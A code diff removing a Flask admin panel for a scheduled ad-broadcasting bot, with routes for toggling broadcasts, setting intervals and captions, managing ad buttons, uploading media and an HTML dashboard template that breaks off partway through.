-    return render_template("admin_login.html", csrf=_csrf(), error="Wrong password")
-
-
-@admin_bp.route("/logout")
-def logout():
-    session.pop("admin_ok", None)
-    return redirect(url_for("admin.login"))
-
-
-# ---------- helpers ----------
-
-def _media_file(path):
-    return os.path.basename(path) if path else None
-
-
-def _valid_url(u):
-    return isinstance(u, str) and u.startswith(("http://", "https://"))
-
-
-def _parse_ad_payload(data):
-    """Ads are buttons only. has_button toggle decides whether to include."""
-    has_button = bool(data.get("has_button"))
-    label      = (data.get("label") or "").strip()
-    url        = (data.get("url") or "").strip()
-    if has_button:
-        if not label:
-            return None, "button name required"
-        if not _valid_url(url):
-            return None, "invalid url"
-    return {"has_button": has_button, "label": label, "url": url}, None
-
-
-# ---------- pages ----------
-
-@admin_bp.route("/")
-def admin_panel():
-    config = get_ads_config()
-    stats = get_stats()
-    stats["active_sessions"] = session_manager.get_active_count()
-    stats["broadcaster_running"] = ads_broadcaster.is_running()
-    return render_template("admin.html", config=config, stats=stats, csrf=_csrf())
-
-
-@admin_bp.route("/stats")
-def admin_stats_page():
-    stats = get_stats()
-    stats["active_sessions"] = session_manager.get_active_count()
-    stats["broadcaster_running"] = ads_broadcaster.is_running()
-    return render_template("stats.html", stats=stats, users=get_all_users(),
-                           config=get_ads_config(), csrf=_csrf())
-
-
-# ---------- api ----------
-
-@admin_bp.route("/api/config")
-def api_config():
-    c = get_ads_config()
-    media = c.get("media_path") or c.get("photo_path")
-    return jsonify({
-        "success": True,
-        "ads_enabled": c.get("ads_enabled", False),
-        "interval_minutes": c.get("interval", 600) // 60,
-        "caption": c.get("caption", ""),
-        "media_file": _media_file(media),
-        "media_type": c.get("media_type") or "photo",
-        "ads": c.get("ads", []),
-        "delete_after_round": c.get("delete_after_round", False),
-        "broadcaster_running": ads_broadcaster.is_running(),
-        "limits": {"min": MIN_INTERVAL_MIN, "max": MAX_INTERVAL_MIN},
-        "csrf": _csrf(),
-    })
-
-
-@admin_bp.route("/api/toggle-ads", methods=["POST"])
-def toggle_ads():
-    c = get_ads_config()
-    new = not c.get("ads_enabled", False)
-    if not update_ads_config({"ads_enabled": new}):
-        return jsonify({"success": False, "error": "update failed"}), 500
-    if users_col is not None:
-        users_col.update_many({}, {"$set": {"ads_enabled": new}})
-    if new:
-        ads_broadcaster.start()
-        session_cleaner.start()
-    else:
-        ads_broadcaster.stop()
-        session_cleaner.stop()
-    return jsonify({"success": True, "enabled": new,
-                    "message": f"Broadcast {'started' if new else 'stopped'}"})
-
-
-@admin_bp.route("/api/toggle-delete-after-round", methods=["POST"])
-def toggle_delete_after_round():
-    c = get_ads_config()
-    new = not c.get("delete_after_round", False)
-    if not update_ads_config({"delete_after_round": new}):
-        return jsonify({"success": False, "error": "update failed"}), 500
-    return jsonify({
-        "success": True,
-        "delete_after_round": new,
-        "message": f"Ads will {'be deleted' if new else 'be kept'} after each round",
-    })
-
-
-@admin_bp.route("/api/set-interval", methods=["POST"])
-def set_interval():
-    data = request.get_json(silent=True) or {}
-    try:
-        m = int(float(data.get("interval")))
-    except (TypeError, ValueError):
-        return jsonify({"success": False, "error": "interval required"}), 400
-    if not (MIN_INTERVAL_MIN <= m <= MAX_INTERVAL_MIN):
-        return jsonify({"success": False,
-                        "error": f"interval {MIN_INTERVAL_MIN}-{MAX_INTERVAL_MIN} min"}), 400
-    if update_ads_config({"interval": m * 60}):
-        return jsonify({"success": True, "minutes": m,
-                        "message": f"Interval set to {m} min"})
-    return jsonify({"success": False, "error": "update failed"}), 500
-
-
-@admin_bp.route("/api/set-caption", methods=["POST"])
-def set_caption():
-    d = request.get_json(silent=True) or {}
-    if update_ads_config({"caption": d.get("caption", "")}):
-        return jsonify({"success": True, "message": "Caption updated"})
-    return jsonify({"success": False, "error": "update failed"}), 500
-
-
-@admin_bp.route("/api/ads", methods=["POST"])
-def add_ad():
-    d = request.get_json(silent=True) or {}
-    payload, err = _parse_ad_payload(d)
-    if err:
-        return jsonify({"success": False, "error": err}), 400
-    payload["id"] = uuid.uuid4().hex[:8]
-    new = mutate_ads(lambda ads: ads + [payload])
-    if new is None:
-        return jsonify({"success": False, "error": "update failed"}), 500
-    return jsonify({"success": True, "ads": new, "message": "Ad added"})
-
-
-@admin_bp.route("/api/ads/<ad_id>", methods=["PUT"])
-def edit_ad(ad_id):
-    d = request.get_json(silent=True) or {}
-    payload, err = _parse_ad_payload(d)
-    if err:
-        return jsonify({"success": False, "error": err}), 400
-
-    def mut(ads):
-        for a in ads:
-            if a.get("id") == ad_id:
-                a.update(payload)
-                return ads
-        return None
-
-    new = mutate_ads(mut)
-    if new is None:
-        return jsonify({"success": False, "error": "not found"}), 404
-    return jsonify({"success": True, "ads": new, "message": "Ad updated"})
-
-
-@admin_bp.route("/api/ads/<ad_id>", methods=["DELETE"])
-def delete_ad(ad_id):
-    def mut(ads):
-        n = [a for a in ads if a.get("id") != ad_id]
-        return n if len(n) != len(ads) else None
-    new = mutate_ads(mut)
-    if new is None:
-        return jsonify({"success": False, "error": "not found"}), 404
-    return jsonify({"success": True, "ads": new, "message": "Ad deleted"})
-
-
-@admin_bp.route("/api/reset-ads", methods=["POST"])
-def reset_ads():
-    old_media = reset_ads_config()
-    if old_media is None and get_ads_config() is None:
-        return jsonify({"success": False, "error": "reset failed"}), 500
-    if old_media:
-        delete_photo_file(old_media)
-    return jsonify({"success": True, "ads": get_ads_config().get("ads", []),
-                    "message": "Ads reset to defaults"})
-
-
-@admin_bp.route("/api/upload-photo", methods=["POST"])
-def upload_photo():
-    if "photo" not in request.files:
-        return jsonify({"success": False, "error": "no file"}), 400
-    f = request.files["photo"]
-    if not f or f.filename == "":
-        return jsonify({"success": False, "error": "no file selected"}), 400
-    if not allowed_file(f.filename):
-        return jsonify({"success": False, "error": "bad file type"}), 400
-
-    ext  = f.filename.rsplit(".", 1)[1].lower()
-    kind = media_kind(f.filename)
-    name = secure_filename(f"ad_media_{datetime.now():%Y%m%d_%H%M%S}.{ext}")
-    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-    path = os.path.join(UPLOAD_FOLDER, name)
-    f.save(path)
-
-    old = get_ads_config().get("media_path") or get_ads_config().get("photo_path")
-    update_ads_config({"media_path": path, "media_type": kind, "photo_path": None})
-    if old and old != path:
-        delete_photo_file(old)
-    return jsonify({"success": True, "media_file": name, "media_type": kind,
-                    "message": f"{kind} uploaded"})
-
-
-@admin_bp.route("/api/remove-photo", methods=["POST"])
-def remove_photo():
-    c = get_ads_config()
-    old = c.get("media_path") or c.get("photo_path")
-    update_ads_config({"media_path": None, "media_type": None, "photo_path": None})
-    delete_photo_file(old)
-    return jsonify({"success": True, "message": "media removed"})
-
-
-@admin_bp.route("/uploads/<path:filename>")
-def serve_upload(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
-
-
-@admin_bp.route("/api/preview")
-def preview_ad():
-    c = get_ads_config()
-    media = c.get("media_path") or c.get("photo_path")
-    return jsonify({
-        "success": True,
-        "media_file": _media_file(media),
-        "media_type": c.get("media_type") or "photo",
-        "caption": c.get("caption", ""),
-        "ads": c.get("ads", []),
-        "interval_minutes": c.get("interval", 600) // 60,
-        "ads_enabled": c.get("ads_enabled", False),
-        "delete_after_round": c.get("delete_after_round", False),
-    })
-
-
-@admin_bp.route("/api/user/<user_id>/toggle", methods=["POST"])
-def toggle_user_ads(user_id):
-    if users_col is None:
-        return jsonify({"success": False, "error": "db down"}), 500
-    try:
-        oid = ObjectId(user_id)
-    except (InvalidId, TypeError):
-        return jsonify({"success": False, "error": "bad id"}), 400
-    u = users_col.find_one({"_id": oid})
-    if not u:
-        return jsonify({"success": False, "error": "not found"}), 404
-    new = not u.get("ads_enabled", True)
-    users_col.update_one({"_id": oid}, {"$set": {"ads_enabled": new}})
-    return jsonify({"success": True, "enabled": new})
-
-
-@admin_bp.route("/api/stats/refresh")
-def refresh_stats():
-    s = get_stats()
-    s["active_sessions"] = session_manager.get_active_count()
-    s["broadcaster_running"] = ads_broadcaster.is_running()
-    return jsonify(s)
-
-
-@admin_bp.route("/api/clear-messages", methods=["POST"])
-def clear_messages():
-    if broadcast_msgs_col is None:
-        return jsonify({"success": False, "error": "db down"}), 500
-    try:
-        n = broadcast_msgs_col.count_documents({})
-        broadcast_msgs_col.delete_many({})
-        return jsonify({"success": True, "cleared_count": n})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-
-Nexa/__init__.py
-
-from flask import Flask
-from config import SECRET_KEY, UPLOAD_FOLDER, MAX_CONTENT_LENGTH
-
-def create_app():
-    app = Flask(__name__)
-    app.secret_key = SECRET_KEY
-    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-    app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH
-
-    # Ensure upload folder exists
-    import os
-    if not os.path.exists(UPLOAD_FOLDER):
-        os.makedirs(UPLOAD_FOLDER)
-
-    # Register blueprints
-    from Nexa.admin_routes import admin_bp
-    app.register_blueprint(admin_bp, url_prefix='/admin')
-
-    return app
-
-
-
-templates/admin.html
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Controller | Admin Panel</title>
-    <link rel="icon" href="data:,">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-primary: #0a0a0f; --bg-secondary: #12121a; --bg-card: #16161f;
-            --bg-hover: #1e1e2a;
-            --accent-primary: #6366f1; --accent-secondary: #8b5cf6;
-            --accent-gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
-            --text-primary: #f8fafc; --text-secondary: #94a3b8; --text-muted: #64748b;
-            --border-color: rgba(255, 255, 255, 0.08);
-            --success: #10b981; --danger: #ef4444; --warning: #f59e0b;
-            --glass: rgba(255, 255, 255, 0.03);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; line-height: 1.6; }
-        .bg-gradient { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; overflow: hidden; }
-        .bg-gradient::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 20% 80%, rgba(99, 102, 241, 0.15) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 50%); animation: pulse 15s ease-in-out infinite; }
-        @keyframes pulse { 0%, 100% { transform: translate(0, 0) scale(1); } 50% { transform: translate(-2%, 2%) scale(1.05); } }
-        .container { max-width: 1400px; margin: 0 auto; padding: 40px 24px; }
-        .header { margin-bottom: 48px; padding-bottom: 32px; border-bottom: 1px solid var(--border-color); }
-        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; gap: 12px; flex-wrap: wrap; }
-        .logo { font-family: 'Space Grotesk', sans-serif; font-size: 28px; font-weight: 700; background: var(--accent-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -0.5px; }
-        .header-actions { display: flex; align-items: center; gap: 12px; }
-        .status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: var(--glass); border: 1px solid var(--border-color); border-radius: 100px; font-size: 13px; font-weight: 500; color: var(--text-secondary); text-decoration: none; }
-        .status-badge.online::before { content: ''; width: 8px; height: 8px; background: var(--success); border-radius: 50%; box-shadow: 0 0 8px var(--success); animation: blink 2s infinite; }
-        .status-badge.offline::before { content: ''; width: 8px; height: 8px; background: var(--warning); border-radius: 50%; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .subtitle { color: var(--text-muted); font-size: 15px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; margin-bottom: 48px; }
-        .stat-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 16px; padding: 24px; position: relative; overflow: hidden; }
-        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--accent-gradient); transform: scaleX(0); transition: transform 0.3s ease; }
-        .stat-card:hover::before { transform: scaleX(1); }
-        .stat-label { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 8px; font-weight: 600; }
-        .stat-value { font-family: 'Space Grotesk', sans-serif; font-size: 32px; font-weight: 700; margin-bottom: 4px; }
-        .stat-change { font-size: 13px; color: var(--text-muted); }
-        .stat-change.positive { color: var(--success); }
-        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 32px; }
-        @media (max-width: 968px) { .main-grid { grid-template-columns: 1fr; } }
-        @media (max-width: 560px) { .container { padding: 24px 16px; } .logo { font-size: 22px; } .stat-value { font-size: 26px; } .quick-stats { grid-template-columns: 1fr; } }
-        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; overflow: hidden; }
-        .card-header { padding: 24px 24px 0; margin-bottom: 8px; }
-        .card-title { font-family: 'Space Grotesk', sans-serif; font-size: 18px; font-weight: 600; margin-bottom: 4px; }
-        .card-subtitle { font-size: 13px; color: var(--text-muted); }
-        .card-body { padding: 24px; }
-        .control-grid { display: grid; gap: 16px; }
-        .control-btn { display: flex; align-items: center; gap: 16px; padding: 20px; background: var(--glass); border: 1px solid var(--border-color); border-radius: 12px; cursor: pointer; text-align: left; width: 100%; color: var(--text-primary); transition: all 0.3s ease; }
-        .control-btn:hover { background: var(--bg-hover); border-color: var(--accent-primary); transform: translateX(4px); }
-        .control-btn.danger:hover { border-color: var(--danger); }
-        .control-icon { width: 48px; height: 48px; border-radius: 12px; background: var(--bg-secondary); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-        .control-icon svg { width: 24px; height: 24px; stroke: var(--text-secondary); }
-        .control-content { flex: 1; }
-        .control-title { font-weight: 600; font-size: 15px; margin-bottom: 2px; }
-        .control-desc { font-size: 13px; color: var(--text-muted); }
-        .quick-stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
-        .quick-stat { padding: 20px; background: var(--glass); border-radius: 12px; border: 1px solid var(--border-color); }
-        .quick-stat-value { font-family: 'Space Grotesk', sans-serif; font-size: 24px; font-weight: 700; margin-bottom: 4px; }
-        .quick-stat-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; }
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px); z-index: 1000; justify-content: center; align-items: center; padding: 24px; }
-        .modal-overlay.active { display: flex; }
-        .modal { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 24px; width: 100%; max-width: 520px; max-height: 90vh; overflow: hidden; animation: modalSlide 0.3s ease; }
-        @keyframes modalSlide { from { opacity: 0; transform: translateY(20px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        .modal-header { padding: 24px 24px 0; display: flex; justify-content: space-between; align-items: center; }
-        .modal-title { font-family: 'Space Grotesk', sans-serif; font-size: 20px; font-weight: 600; }
-        .modal-close { width: 36px; height: 36px; border-radius: 10px; border: 1px solid var(--border-color); background: transparent; color: var(--text-muted); cursor: pointer; }
-        .modal-close:hover { background: var(--bg-hover); color: var(--text-primary); }
-        .modal-body { padding: 24px; overflow-y: auto; max-height: 65vh; }
-        .form-group { margin-bottom: 20px; }
-        .form-label { display: block; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 8px; }
-        .form-input, .form-textarea { width: 100%; padding: 14px 16px; background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; color: var(--text-primary); font-size: 14px; font-family: inherit; }
-        .form-input:focus, .form-textarea:focus { outline: none; border-color: var(--accent-primary); }
-        .form-textarea { min-height: 120px; resize: vertical; }
-        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 14px 24px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; width: 100%; transition: all 0.2s; }
-        .btn-primary { background: var(--accent-gradient); color: white; }
-        .btn-primary:hover { transform: translateY(-2px); }
-        .btn-secondary { background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border-color); }
-        .btn-secondary:hover { background: var(--bg-hover); }
-        .btn-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); }
-        .btn-danger:hover { background: rgba(239, 68, 68, 0.2); }
-        .btn-group { display: flex; gap: 12px; }
-        .btn-group .btn { flex: 1; }
-        .btn-sm { padding: 8px 14px; font-size: 13px; width: auto; }
-        .toast-container { position: fixed; bottom: 24px; right: 24px; z-index: 2000; display: flex; flex-direction: column; gap: 12px; }
-        .toast { padding: 16px 20px; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; font-size: 14px; font-weight: 500; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4); }
-        .toast.success { border-color: var(--success); background: rgba(16, 185, 129, 0.1); }
-        .toast.error { border-color: var(--danger); background: rgba(239, 68, 68, 0.1); }
-        .toggle-wrapper { display: flex; align-items: center; justify-content: space-between; padding: 20px; background: var(--glass); border-radius: 12px; border: 1px solid var(--border-color); cursor: pointer; }
-        .toggle-info h4 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
-        .toggle-info p { font-size: 13px; color: var(--text-muted); }
-        .toggle-switch { position: relative; width: 52px; height: 28px; background: var(--bg-secondary); border-radius: 14px; transition: all 0.3s; border: 1px solid var(--border-color); flex-shrink: 0; }
-        .toggle-switch.active { background: var(--accent-primary); border-color: var(--accent-primary); }
-        .toggle-switch::after { content: ''; position: absolute; top: 3px; left: 3px; width: 20px; height: 20px; background: white; border-radius: 50%; transition: all 0.3s; }
-        .toggle-switch.active::after { left: 27px; }
-        .ad-item { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; padding: 16px; margin-bottom: 12px; }
-        .ad-item .tag { font-size: 11px; color: var(--accent-secondary); font-weight: 600; text-transform: uppercase; }
-        .ad-item .lbl { font-weight: 600; margin: 4px 0; }
-        .ad-item .url { color: var(--text-muted); font-size: 12px; word-break: break-all; }
-        .ad-item .disabled { opacity: 0.5; font-style: italic; color: var(--text-muted); font-size: 12px; }
-        .preview-image { width: 100%; border-radius: 12px; margin-bottom: 16px; display: block; }
-        .muted { color: var(--text-muted); font-size: 13px; }
-        .spin { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .ad-preview {
-            background: #0e1621;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 12px;
-            max-width: 380px;
-            margin: 0 auto;
-            font-family: -apple-system, sans-serif;
-        }
-        .ad-preview-media { width: 100%; border-radius: 8px; margin-bottom: 8px; display: block; }
-        .ad-preview-caption { font-size: 13px; color: #e4e6eb; white-space: pre-wrap; word-break: break-word; margin-bottom: 8px; line-height: 1.4; }
-        .ad-preview-btn {
-            display: block;
-            text-align: center;
-            padding: 8px 12px;
-            background: rgba(99,102,241,0.15);
-            border-radius: 8px;
-            color: #a5b4fc;
-            font-size: 13px;
-            font-weight: 500;
-            margin-top: 6px;
-            text-decoration: none;
-            border: 1px solid rgba(99,102,241,0.25);
-        }
-    </style>
-</head>
-<body>
-    <div class="bg-gradient"></div>
-
-    <div class="container">
-        <header class="header">
-            <div class="header-top">
-                <h1 class="logo">BOT CONTROLLER</h1>
-                <div class="header-actions">
-                    <span class="status-badge {{ 'online' if stats.broadcaster_running else 'offline' }}" id="sysBadge">
-                        {{ 'Scheduler Running' if stats.broadcaster_running else 'Scheduler Idle' }}
-                    </span>
-                    <a class="status-badge" href="logout">Logout</a>
-                </div>
-            </div>
-            <p class="subtitle">Manage broadcast timing, advertisements, and bot operations</p>
-        </header>
-
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">Total Users</div>
-                <div class="stat-value" id="statTotal">{{ stats.total_users }}</div>
-                <div class="stat-change">Registered accounts</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Subscribed</div>
-                <div class="stat-value" id="statSubscribed">{{ stats.opted_in }}</div>
-                <div class="stat-change positive">+{{ stats.recent_users }} joined today</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Deliveries</div>
-                <div class="stat-value" id="statDeliveries">{{ stats.total_deliveries }}</div>
-                <div class="stat-change">Successful sends</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Broadcast Status</div>
-                <div class="stat-value" id="statBroadcast" style="font-size: 24px; margin-top: 4px;">
-                    {{ 'ACTIVE' if config.ads_enabled else 'PAUSED' }}
-                </div>
-                <div class="stat-change" id="statInterval">{{ (config.interval or 600) // 60 }}min interval</div>
-            </div>
-        </div>
-
-        <div class="main-grid">
-            <div class="card">
-                <div class="card-header">
-                    <h2 class="card-title">Control Panel</h2>
-                    <p class="card-subtitle">Manage bot operations and settings</p>
-                </div>
-                <div class="card-body">
-                    <div class="control-grid">
-                        <div class="toggle-wrapper" id="toggleWrap" onclick="toggleAds()">
-                            <div class="toggle-info">
-                                <h4>Broadcast Service</h4>
-                                <p id="toggleStatus">{{ 'Running' if config.ads_enabled else 'Stopped' }}</p>
-                            </div>
-                            <div class="toggle-switch {{ 'active' if config.ads_enabled else '' }}" id="toggleSwitch"></div>
-                        </div>
-
-                        <button class="control-btn" onclick="openModal('intervalModal')">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Set Interval</div>
-                                <div class="control-desc">Configure broadcast timing</div>
-                            </div>
-                        </button>
-
-                        <button class="control-btn" onclick="openModal('adsModal')">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3h18v14H3z"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Advertisements</div>
-                                <div class="control-desc">Add, edit, or delete ad buttons</div>
-                            </div>
-                        </button>
-
-                        <button class="control-btn" onclick="openModal('photoModal')">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Upload Media</div>
-                                <div class="control-desc">Set broadcast image or video</div>
-                            </div>
-                        </button>
-
-                        <button class="control-btn" onclick="openModal('captionModal')">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Edit Caption</div>
-                                <div class="control-desc">Modify main message text</div>
-                            </div>
-                        </button>
-
-                        <button class="control-btn" onclick="openPreview()">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Preview Ad</div>
-                                <div class="control-desc">See the ad exactly as it will send</div>
-                            </div>
-                        </button>
-
-                        <div class="toggle-wrapper" id="delWrap" onclick="toggleDelete()">
-                            <div class="toggle-info">
-                                <h4>Delete Ads After Round</h4>
-                                <p id="delStatus">{{ 'Ads are deleted after each round' if config.delete_after_round else 'Ads are kept after each round' }}</p>
-                            </div>
-                            <div class="toggle-switch {{ 'active' if config.delete_after_round else '' }}" id="delSwitch"></div>
-                        </div>
-
-                        <button class="control-btn danger" onclick="openModal('resetModal')">
-                            <div class="control-icon">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 109-9 9.75 9.75 0 00-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
-                            </div>
-                            <div class="control-content">
-                                <div class="control-title">Reset Ads</div>
-                                <div class="control-desc">Restore default advertisements</div>
-                            </div>
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="card">
-                <div class="card-header">
-                    <h2 class="card-title">Live Activity</h2>
-                    <p class="card-subtitle">Real-time system metrics</p>
-                </div>
-                <div class="card-body">
-                    <div class="quick-stats">
-                        <div class="quick-stat">
-                            <div class="quick-stat-value" id="quickSessions">{{ stats.active_sessions or 0 }}</div>
-                            <div class="quick-stat-label">Active Sessions</div>
-                        </div>
-                        <div class="quick-stat">
-                            <div class="quick-stat-value" id="quickBroadcastMode">{{ stats.broadcast_mode_users or 0 }}</div>
-                            <div class="quick-stat-label">IDs in Broadcast Mode</div>
-                        </div>
-                        <div class="quick-stat">
-                            <div class="quick-stat-value" id="quickOnline">{{ stats.online_users or 0 }}</div>
-                            <div class="quick-stat-label">Sent Last Hour</div>
-                        </div>
-                        <div class="quick-stat">
-                            <div class="quick-stat-value" id="quickRegisteredToday">{{ stats.registered_today or 0 }}</div>
-                            <div class="quick-stat-label">Registered Today</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Interval Modal -->
-    <div class="modal-overlay" id="intervalModal" onclick="closeModalOnOverlay(event, 'intervalModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Set Interval</h3>
-                <button class="modal-close" onclick="closeModal('intervalModal')">✕</button>
-            </div>
-            <div class="modal-body">
-                <p class="muted" style="margin-bottom:16px">First broadcast fires after one full interval, then repeats. Min 1, max 1440 minutes.</p>
-                <div class="form-group">
-                    <label class="form-label">Custom interval (minutes)</label>
-                    <input class="form-input" type="number" id="intervalInput" min="1" max="1440" value="{{ (config.interval or 600) // 60 }}">
-                </div>
-                <div class="btn-group">
-                    <button class="btn btn-primary" onclick="saveInterval(this)">Save Interval</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Ads Modal -->
-    <div class="modal-overlay" id="adsModal" onclick="closeModalOnOverlay(event, 'adsModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Advertisements</h3>
-                <button class="modal-close" onclick="closeModal('adsModal')">✕</button>
-            </div>
-            <div class="modal-body">
-                <div id="adList"><p class="muted">Loading…</p></div>
-                <hr style="border:none;border-top:1px solid var(--border-color);margin:16px 0">
-                <h4 id="adFormTitle" style="font-family:'Space Grotesk';margin-bottom:12px">Add Advertisement</h4>
-                <input type="hidden" id="adId">
-
-                <div class="toggle-wrapper" style="margin-bottom:20px" onclick="toggleAdButton()">
-                    <div class="toggle-info">
-                        <h4>Attach Button</h4>
-                        <p>Include this button in the broadcast</p>
-                    </div>
-                    <div class="toggle-switch" id="adBtnToggle"></div>
-                </div>
-
-                <div id="adBtnFields">
-                    <div class="form-group">
-                        <label class="form-label">Button name</label>
-                        <input class="form-input" id="adLabel" placeholder="e.g. Adult Content Available">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Destination URL</label>
-                        <input class="form-input" id="adUrl" placeholder="https://...">
-                    </div>
-                </div>
-
-                <div class="btn-group">
-                    <button class="btn btn-primary" onclick="saveAd(this)">Save Ad</button>
-                    <button class="btn btn-secondary" onclick="clearAdForm()">Clear</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Media Modal -->
-    <div class="modal-overlay" id="photoModal" onclick="closeModalOnOverlay(event, 'photoModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Upload Media</h3>
-                <button class="modal-close" onclick="closeModal('photoModal')">✕</button>
-            </div>
-            <div class="modal-body">
-                <div class="form-group">
-                    <input type="file" id="photoInput" accept="image/*,video/*" onchange="uploadPhoto(this)">
-                </div>
-                <div id="mediaWrap" {% if not config.media_path and not config.photo_path %}style="display:none"{% endif %}>
-                    <img class="preview-image" id="photoPrev" style="display:none">
-                    <video class="preview-image" id="videoPrev" controls style="display:none"></video>
-                    <button class="btn btn-danger" onclick="removePhoto(this)">Remove Media</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Caption Modal -->
-    <div class="modal-overlay" id="captionModal" onclick="closeModalOnOverlay(event, 'captionModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Edit Caption</h3>
-                <button class="modal-close" onclick="closeModal('captionModal')">✕</button>
-            </div>
-            <div class="modal-body">
-                <div class="form-group">
-                    <label class="form-label">Broadcast Message</label>
-                    <textarea class="form-textarea" id="captionText">{{ config.caption or '' }}</textarea>
-                </div>
-                <button class="btn btn-primary" onclick="saveCaption(this)">Save Changes</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Preview Modal -->
-    <div class="modal-overlay" id="previewModal" onclick="closeModalOnOverlay(event, 'previewModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Ad Preview</h3>
-                <button class="modal-close" onclick="closeModal('previewModal')">✕</button>
-            </div>
-            <div class="modal-body">
